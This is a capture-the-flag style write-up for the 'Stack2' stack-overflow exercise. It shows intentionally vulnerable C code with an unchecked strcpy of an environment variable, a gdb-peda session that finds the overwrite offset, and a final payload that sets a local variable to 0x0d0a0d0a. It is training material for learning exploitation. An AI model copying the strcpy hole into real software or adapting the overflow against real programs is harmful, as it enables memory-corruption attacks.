# Stack2

* Source code

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
    volatile int modified;
    char buffer[64];
    char *variable;

    variable = getenv("GREENIE");

    if(variable == NULL) {
        errx(1, "please set the GREENIE environment variable\n");
    }

    modified = 0;

    strcpy(buffer, variable);

    if(modified == 0x0d0a0d0a) {
        printf("you have correctly modified the variable\n");
    } else {
        printf("Try again, you got 0x%08x\n", modified);
    }

}
```

* Solution
```
root@kali:~/Desktop# export GREENIE=AAAAAAAAAA

root@kali:~/Desktop# env | grep GREENIE
GREENIE=AAAAAAAAAA

root@kali:~/Desktop# ./stack2
Try again, you got 0x00000000

root@kali:~/Desktop# gdb ./stack2
GNU gdb (Debian 8.2-1) 8.2
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./stack2...(no debugging symbols found)...done.
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0000000000401162 <+0>:	push   rbp
   0x0000000000401163 <+1>:	mov    rbp,rsp
   0x0000000000401166 <+4>:	sub    rsp,0x60
   0x000000000040116a <+8>:	mov    DWORD PTR [rbp-0x54],edi
   0x000000000040116d <+11>:	mov    QWORD PTR [rbp-0x60],rsi
   0x0000000000401171 <+15>:	lea    rdi,[rip+0xe90]        # 0x402008
   0x0000000000401178 <+22>:	call   0x401030 <getenv@plt>
   0x000000000040117d <+27>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401181 <+31>:	cmp    QWORD PTR [rbp-0x8],0x0
   0x0000000000401186 <+36>:	jne    0x40119e <main+60>
   0x0000000000401188 <+38>:	lea    rsi,[rip+0xe81]        # 0x402010
   0x000000000040118f <+45>:	mov    edi,0x1
   0x0000000000401194 <+50>:	mov    eax,0x0
   0x0000000000401199 <+55>:	call   0x401060 <errx@plt>
   0x000000000040119e <+60>:	mov    DWORD PTR [rbp-0xc],0x0
   0x00000000004011a5 <+67>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004011a9 <+71>:	lea    rax,[rbp-0x50]
   0x00000000004011ad <+75>:	mov    rsi,rdx
   0x00000000004011b0 <+78>:	mov    rdi,rax
   0x00000000004011b3 <+81>:	call   0x401040 <strcpy@plt>
   0x00000000004011b8 <+86>:	mov    eax,DWORD PTR [rbp-0xc]
   0x00000000004011bb <+89>:	cmp    eax,0xd0a0d0a
   0x00000000004011c0 <+94>:	jne    0x4011d0 <main+110>
   0x00000000004011c2 <+96>:	lea    rdi,[rip+0xe77]        # 0x402040
   0x00000000004011c9 <+103>:	call   0x401050 <puts@plt>
   0x00000000004011ce <+108>:	jmp    0x4011e6 <main+132>
   0x00000000004011d0 <+110>:	mov    eax,DWORD PTR [rbp-0xc]
   0x00000000004011d3 <+113>:	mov    esi,eax
   0x00000000004011d5 <+115>:	lea    rdi,[rip+0xe8d]        # 0x402069
   0x00000000004011dc <+122>:	mov    eax,0x0
   0x00000000004011e1 <+127>:	call   0x401070 <printf@plt>
   0x00000000004011e6 <+132>:	mov    eax,0x0
   0x00000000004011eb <+137>:	leave  
   0x00000000004011ec <+138>:	ret    
End of assembler dump.
gdb-peda$ b *main+89
Breakpoint 1 at 0x4011bb
gdb-peda$ run
Starting program: /root/Desktop/stack2 

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7fffffffed4d ("AAAAAAAAAA")
RDX: 0x7fffffffe150 ("AAAAAAAAAA")
RSI: 0x7fffffffed4d ("AAAAAAAAAA")
RDI: 0x7fffffffe150 ("AAAAAAAAAA")
RBP: 0x7fffffffe1a0 --> 0x4011f0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe140 --> 0x7fffffffe288 --> 0x7fffffffe569 ("/root/Desktop/stack2")
RIP: 0x4011bb (<main+89>:	cmp    eax,0xd0a0d0a)
R8 : 0x7ffff7fa7d80 --> 0x0 
R9 : 0x7ffff7fa7d80 --> 0x0 
R10: 0x5f ('_')
R11: 0x7ffff7f36c90 (<__strcpy_ssse3>:	mov    rcx,rsi)
R12: 0x401080 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe280 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011b0 <main+78>:	mov    rdi,rax
   0x4011b3 <main+81>:	call   0x401040 <strcpy@plt>
   0x4011b8 <main+86>:	mov    eax,DWORD PTR [rbp-0xc]
=> 0x4011bb <main+89>:	cmp    eax,0xd0a0d0a
   0x4011c0 <main+94>:	jne    0x4011d0 <main+110>
   0x4011c2 <main+96>:	lea    rdi,[rip+0xe77]        # 0x402040
   0x4011c9 <main+103>:	call   0x401050 <puts@plt>
   0x4011ce <main+108>:	jmp    0x4011e6 <main+132>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe140 --> 0x7fffffffe288 --> 0x7fffffffe569 ("/root/Desktop/stack2")
0008| 0x7fffffffe148 --> 0x1ffffe176 
0016| 0x7fffffffe150 ("AAAAAAAAAA")
0024| 0x7fffffffe158 --> 0x7ffff7004141 
0032| 0x7fffffffe160 --> 0x0 
0040| 0x7fffffffe168 --> 0x40123d (<__libc_csu_init+77>:	add    rbx,0x1)
0048| 0x7fffffffe170 --> 0x7ffff7fe42a0 (<_dl_fini>:	push   rbp)
0056| 0x7fffffffe178 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00000000004011bb in main ()
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ quit
root@kali:~/Desktop# export GREENIE='AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
root@kali:~/Desktop# gdb ./stack2
GNU gdb (Debian 8.2-1) 8.2
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./stack2...(no debugging symbols found)...done.
gdb-peda$ b *main+89
Breakpoint 1 at 0x4011bb
gdb-peda$ run 
Starting program: /root/Desktop/stack2 

[----------------------------------registers-----------------------------------]
RAX: 0x41413341 ('A3AA')
RBX: 0x0 
RCX: 0x7fffffffed50 --> 0x4c414136414167 ('gAA6AAL')
RDX: 0x7fffffffe14d --> 0x4c414136414167 ('gAA6AAL')
RSI: 0xd ('\r')
RDI: 0x7fffffffe0f0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RBP: 0x7fffffffe140 ("AJAAfAA5AAKAAgAA6AAL")
RSP: 0x7fffffffe0e0 --> 0x7fffffffe228 --> 0x7fffffffe50f ("/root/Desktop/stack2")
RIP: 0x4011bb (<main+89>:	cmp    eax,0xd0a0d0a)
R8 : 0x7ffff7fa7d80 --> 0x0 
R9 : 0x6e41412441414241 ('ABAA$AAn')
R10: 0x5f ('_')
R11: 0x7ffff7f36c90 (<__strcpy_ssse3>:	mov    rcx,rsi)
R12: 0x401080 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe220 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011b0 <main+78>:	mov    rdi,rax
   0x4011b3 <main+81>:	call   0x401040 <strcpy@plt>
   0x4011b8 <main+86>:	mov    eax,DWORD PTR [rbp-0xc]
=> 0x4011bb <main+89>:	cmp    eax,0xd0a0d0a
   0x4011c0 <main+94>:	jne    0x4011d0 <main+110>
   0x4011c2 <main+96>:	lea    rdi,[rip+0xe77]        # 0x402040
   0x4011c9 <main+103>:	call   0x401050 <puts@plt>
   0x4011ce <main+108>:	jmp    0x4011e6 <main+132>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe0e0 --> 0x7fffffffe228 --> 0x7fffffffe50f ("/root/Desktop/stack2")
0008| 0x7fffffffe0e8 --> 0x1ffffe116 
0016| 0x7fffffffe0f0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0x7fffffffe0f8 ("ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0032| 0x7fffffffe100 ("AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0040| 0x7fffffffe108 ("(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0048| 0x7fffffffe110 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0056| 0x7fffffffe118 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00000000004011bb in main ()
gdb-peda$ pattern offset A3AA
A3AA found at offset: 68
gdb-peda$ quit
root@kali:~/Desktop# export GREENIE=$(python -c 'print "A"*68 + "\x0a\x0d"*2')
root@kali:~/Desktop# ./stack2
you have correctly modified the variable
```
